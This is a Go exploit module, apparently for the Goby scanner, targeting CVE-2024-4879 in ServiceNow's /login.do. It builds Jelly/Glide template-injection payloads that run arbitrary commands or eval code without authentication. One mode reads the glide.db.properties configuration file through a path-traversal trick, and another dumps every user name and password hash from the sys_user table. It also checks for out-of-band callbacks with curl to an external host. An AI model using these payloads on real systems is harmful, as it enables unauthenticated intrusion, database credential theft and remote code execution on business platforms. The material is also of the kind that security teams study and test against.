package exploits

import (
	"fmt"
	"math/rand"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "ServiceNowUI /login.do Input Validation Vulnerability（CVE-2024-4879）",
    "Description": "<p>ServiceNow is a business transformation platform. Through the various modules on the platform, ServiceNow can be used for a variety of purposes, from HR and employee management to automating workflows or serving as a knowledge base. </p><p>ServiceNow's Jelly templates and Glide expressions have an injection vulnerability due to lax input validation. These vulnerabilities can be exploited by an unauthenticated attacker by crafting malicious requests to remotely execute code in ServiceNow.</p>",
    "Product": "servicenow-Products",
    "Homepage": "https://www.servicenow.com/",
    "DisclosureDate": "2024-07-10",
    "PostTime": "2024-07-17",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"thirdparty/piwik.min.js\" && body=\"/uxsw/scope/root.js\"",
    "GobyQuery": "body=\"thirdparty/piwik.min.js\" && body=\"/uxsw/scope/root.js\"",
    "Level": "2",
    "Impact": "<p>This vulnerability could enable an unauthenticated user to remotely execute code within the context of the Now Platform.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.servicenow.com/\">https://www.servicenow.com/</a></p>",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=2024-4879",
        "https://www.assetnote.io/resources/research/chaining-three-bugs-to-access-all-your-servicenow-data"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "default,eval,cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "mode=cmd"
        },
        {
            "name": "eval",
            "type": "input",
            "value": "gs.addErrorMessage(7*7);",
            "show": "mode=eval"
        },
        {
            "name": "default",
            "type": "select",
            "value": "sys_user,/conf/glide.db.properties",
            "show": "mode=default"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "Code Execution",
        "File Read"
    ],
    "VulType": [
        "Command Execution",
        "Code Execution",
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2024-4879"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.3",
    "Translation": {
        "CN": {
            "Name": "ServiceNowUI /login.do Jelly模板注入漏洞（CVE-2024-4879）",
            "Product": "servicenow-Products",
            "Description": "<p>ServiceNow 是一个业务转型平台。通过平台上的各个模块，ServiceNow 可用于从人力资源和员工管理到自动化工作流程或作为知识库等各种用途。<br></p><p>ServiceNow的Jelly模板和Glide表达式由于输入验证不严格，存在注入漏洞。这些漏洞可以被未经身份验证的攻击者通过构造恶意请求利用，在ServiceNow中获取敏感文件，甚至远程执行代码。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.servicenow.com/\">https://www.servicenow.com/</a><br></p>",
            "Impact": "<p>这些漏洞可以被未经身份验证的攻击者通过构造恶意请求利用，在ServiceNow中获取敏感文件，甚至远程执行代码。<br></p>",
            "VulType": [
                "文件读取",
                "代码执行",
                "命令执行"
            ],
            "Tags": [
                "文件读取",
                "代码执行",
                "命令执行"
            ]
        },
        "EN": {
            "Name": "ServiceNowUI /login.do Input Validation Vulnerability（CVE-2024-4879）",
            "Product": "servicenow-Products",
            "Description": "<p>ServiceNow is a business transformation platform. Through the various modules on the platform, ServiceNow can be used for a variety of purposes, from HR and employee management to automating workflows or serving as a knowledge base.&nbsp;</p><p>ServiceNow's Jelly templates and Glide expressions have an injection vulnerability due to lax input validation. These vulnerabilities can be exploited by an unauthenticated attacker by crafting malicious requests to remotely execute code in ServiceNow.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.servicenow.com/\">https://www.servicenow.com/</a><br></p>",
            "Impact": "<p>This vulnerability could enable an unauthenticated user to remotely execute code within the context of the Now Platform.<br></p>",
            "VulType": [
                "Command Execution",
                "Code Execution",
                "File Read"
            ],
            "Tags": [
                "Command Execution",
                "Code Execution",
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10971"
}`
	setPayloadRequestHash4efwemihadfafyqbfg73yugwfbygqf := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用
		//漏洞url地址
		commandResult := ""
		vulnurl := "/login.do"
		//将command进行url编码
		command = url.QueryEscape(`<style><j:jelly xmlns:j="jelly" xmlns:g='glide'><g:evaluate>` + command + `</g:evaluate></j:jelly></style>`)
		makeRequest := httpclient.NewGetRequestConfig("/login.do?jvar_page_title=" + command)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 10
		makeRequest.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
			if resp.StatusCode == 200 {
				commandResult = resp.RawBody
				return commandResult, vulnurl, nil
			}
		}
		err := fmt.Errorf("返回包异常")
		return commandResult, vulnurl, err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash4efwemihadfafyqbfg73yugwfbygqf

			//验证方式1,回显验证
			//生成4位随机数字
			rand.Seed(time.Now().UnixNano())
			randomNumber1 := 1000 + rand.Intn(9000) // 生成一个1000到9999之间的随机数，确保是四位数
			randomNumber2 := 1000 + rand.Intn(9000) // 生成一个1000到9999之间的随机数，确保是四位数
			text := fmt.Sprintf("%d", randomNumber1*randomNumber2)
			pocCommand := `gs.addErrorMessage(` + strconv.Itoa(randomNumber1) + `*` + strconv.Itoa(randomNumber2) + `);`
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}

			//验证方式2,无回显验证
      //当无法通过回显验证时尝试使用无回显验证,值得注意的时当无回显验证成功时,exp中应该只有cmd能够执行curl的命令,exp中的文件读取和eval将无返回结果
			checkStr := goutils.RandomHexString(6)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			pocCommand = "curl http://" + checkUrl
			key := `q = SncProbe.get("Command");q.setName("` + pocCommand + `");q.create("*");`
			_, pocUrl, err = runPayload(hostInfo, key)
			if err != nil {
				return false
			}
			if godclient.PullExists(checkStr, time.Second*15) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 配置正则语句，从响应包中提取出数据
			regular := `<div class="outputmsg_text">([\s\S]*?)</div>`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setPayloadRequestHash4efwemihadfafyqbfg73yugwfbygqf
			attacktype := goutils.B2S(ss.Params["mode"])
			if attacktype == "cmd" {
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				//将command中的双引号替换为单引号
				command = strings.Replace(command, "\"", "'", -1)
				key := `q = SncProbe.get("Command");q.setName("` + command + `");q.create("*");`
				_, _, err := sendPayload(expResult.HostInfo, key)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = "执行成功,该漏洞无回显,请自行判断执行效果"
			} else if attacktype == "default" {
				key := goutils.B2S(ss.Params["default"])
				if key == "/conf/glide.db.properties" {
					key = `z=new Packages.java.io.File("").getAbsolutePath();z=z.substring(0,z.lastIndexOf("/"));u=new SecurelyAccess(z.concat("/co..nf/glide.db.properties")).getBufferedReader();s="";while((q=u.readLine())!==null)s=s.concat(q,"\n");gs.addErrorMessage(s);`
				} else if key == "sys_user" {
					key = `gr=new GlideRecord("sys_user");gr.query();s="";while(gr.next())s=s.concat(gr.user_name," : ",gr.user_password,"<br/>");gs.addErrorMessage(s);`
				}
				resp, _, err := sendPayload(expResult.HostInfo, key)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				//删除返回字符串中的<br />
				output = strings.Replace(output, "<br />", "\n", -1)
				expResult.Output = output
			} else if attacktype == "eval" {
				key := goutils.B2S(ss.Params["eval"])
				resp, _, err := sendPayload(expResult.HostInfo, key)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
